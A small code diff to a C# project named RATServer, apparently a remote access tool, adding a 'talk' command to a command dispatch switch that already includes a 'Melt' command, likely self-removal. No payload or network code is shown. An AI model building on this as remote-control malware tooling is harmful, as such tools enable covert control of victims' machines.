@@ -126,6 +126,9 @@ namespace RATServer
                             r = Functions.Melt();
                             exitAfter = true;
                             break;
+                        case "talk":
+                            r = Functions.Talk(c.Args[0]);
+                            break;
                         default:
                             break;
                     }                 
